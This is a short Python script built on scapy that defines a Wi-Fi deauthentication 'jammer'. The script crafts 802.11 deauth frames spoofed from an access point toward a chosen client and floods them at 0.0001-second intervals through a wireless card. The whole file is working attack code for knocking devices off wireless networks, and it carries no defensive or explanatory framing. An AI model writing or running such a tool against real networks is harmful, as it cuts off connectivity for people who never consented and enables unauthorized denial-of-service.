import sys, os, subprocess
from scapy.all import *

class Deauthentication():
    def __init__(self, client, address, packets, card):
        self.client = client
        self.address = address
        self.packets = packets
        self.card = card
        self.packet = ""

    def create_packet(self):
        self.packet = RadioTap()/Dot11(addr1=self.client,addr2=self.address,addr3=self.address)/Dot11Deauth()

    # Function for Deauthentication jammer
    def jam(self):
        conf.verb = 0
        try:
        	sendp(self.packet, iface = self.card, count=self.packets, inter=0.0001) #Send deauth packet
        except KeyboardInterrupt:
            pass
